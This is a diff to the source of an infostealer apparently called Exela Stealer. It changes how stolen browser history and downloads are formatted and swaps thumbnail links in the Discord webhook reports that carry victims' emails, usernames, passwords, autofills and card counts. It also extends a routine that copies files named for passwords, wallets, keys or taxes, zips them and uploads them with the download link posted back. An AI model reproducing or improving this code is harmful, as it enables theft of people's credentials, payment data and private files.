@@ -252,7 +252,7 @@ class Main:
                     cursor.execute('SELECT id, url, title, visit_count, last_visit_date FROM moz_places')
                     historys = cursor.fetchall()
                     for history in historys:
-                        self.FirefoxHistoryList.append(f"ID: {history[0]} | URL: {history[1]} | Title: {history[2]} | Visit Count: {history[3]} | Last Visit Time: {history[4]}\n")
+                        self.FirefoxHistoryList.append(f"ID: {history[0]}\nRL: {history[1]}\nTitle: {history[2]}\nVisit Count: {history[3]}\nLast Visit Time: {history[4]}\n====================================================================================\n")
         except:
             pass
         else:
@@ -461,7 +461,7 @@ class Main:
                     os.remove(copied_file_path)
                 except:pass
                 for history in historys:
-                    Variables.Historys.append(f"ID : {history[0]} | URL : {history[1]} | Title : {history[2]} | Visit Count : {history[3]} | Last Visit Time {history[4]}\n")
+                    Variables.Historys.append(f"ID : {history[0]}\nURL : {history[1]}\nitle : {history[2]}\nVisit Count : {history[3]}\nLast Visit Time {history[4]}\n====================================================================================\n")
         except:
             pass
 
@@ -513,7 +513,7 @@ class Main:
                     os.remove(copied_file_path)
                 except:pass
                 for download in downloads:
-                    Variables.Downloads.append(f"{download[0]} : {download[1]}\n")
+                    Variables.Downloads.append(f"Downloaded URL: {download[0]}\nDownloaded Path: {download[1]}\n\n")
         except:
             pass
     async def StealUplay(self, uuid:str) -> None:
@@ -959,7 +959,7 @@ class Main:
                 "url" : "https://t.me/ExelaStealer",
                 "color": 0,
                 "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
-                "thumbnail": {"url": "https://media.discordapp.net/attachments/1145679170127532095/1145756091553173696/3-min-5.jpg"}}
+                "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
             fields = [
                 {"name": "Email", "value": "``" + str(email) + "``", "inline": True},
                 {"name": "Username", "value": "``" + str(username) + "``", "inline": True},
@@ -1831,7 +1831,7 @@ class Main:
                 "url" : "https://t.me/ExelaStealer",
                 "color": 0,
                 "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
-                "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
+                "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
             fields = [
                 {"name": "Passwords", "value": "```" + str(password_keys) + "```", "inline": False},
                 {"name": "Autofills", "value": "```" +  str(autofill_keys) + "```", "inline": False},
@@ -1867,7 +1867,7 @@ class Main:
             "url" : "https://t.me/ExelaStealer",
             "color": 0,
             "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
-            "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
+            "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
         fields = [
              {"name": "Password", "value": "``" + str(len(Variables.Passwords)) + "``", "inline": True},
              {"name": "Card", "value": "``" + str(len(Variables.Cards)) + "``", "inline": True},
@@ -1916,7 +1916,7 @@ class Main:
                         "url" : "https://t.me/ExelaStealer",
                         "color": 0,
                         "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
-                        "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
+                        "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
                     fields2 = [{"name": "Download Link", "value": f"[{uuid}.zip]({succes})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
@@ -1968,7 +1968,7 @@ class UploadGoFile:
 class StealCommonFiles:
     def __init__(self) -> None:
         self.temp = os.getenv("temp")
-        
+
     async def StealFiles(self) -> None:
         try:
             source_directories = (
@@ -1988,7 +1988,7 @@ class StealCommonFiles:
 
             keywords = ["secret", "password", "account", "tax", "key", "wallet", "backup"]
             allowed_extensions = [".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv", ".mp3", ".mp4", ".xls", ".xlsx", ".zip"]
-            
+
             for _, source_path in source_directories:
                 if os.path.isdir(source_path):
                     for folder_path, _, files in os.walk(source_path):
@@ -2003,7 +2003,15 @@ class StealCommonFiles:
                                 and os.path.getsize(file_path) < 2 * 1024 * 1024
                                 or any(keyword in file_name.lower() for keyword in keywords)
                             ):
-                                destination_path = os.path.join(destination_directory, file_name)
+                                # Create a folder with the source folder name
+                                source_folder_name = os.path.basename(os.path.normpath(folder_path))
+                                destination_folder_path = os.path.join(destination_directory, source_folder_name)
+
+                                if not os.path.exists(destination_folder_path):
+                                    os.makedirs(destination_folder_path)
+
+                                # Copy the file to the destination folder
+                                destination_path = os.path.join(destination_folder_path, file_name)
                                 shutil.copy2(file_path, destination_path)
 
             shutil.make_archive(destination_directory, 'zip', destination_directory)
@@ -2016,7 +2024,7 @@ class StealCommonFiles:
                             "url" : "https://t.me/ExelaStealer",
                             "color": 0,
                             "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd/Exela-V2.0"},
-                            "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
+                            "thumbnail": {"url": "https://i.hizliresim.com/6t31tw2.jpg"}}
                     fields2 = [{"name": "Download Link", "value": f"[Files.zip]({uploaded_url})", "inline": True}]
                     embed_data2["fields"] = fields2
                     payload2 = {
